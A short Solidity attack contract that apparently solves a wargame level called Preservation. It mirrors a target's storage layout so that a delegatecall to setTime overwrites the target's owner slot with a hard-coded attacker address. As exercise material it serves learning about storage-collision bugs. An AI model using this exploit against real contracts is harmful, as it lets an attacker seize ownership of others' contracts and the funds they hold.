// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) public {
        address eve = 0xa959355654849CbEAbBf65235f8235833b9e031D;
        owner = eve;
    }
}
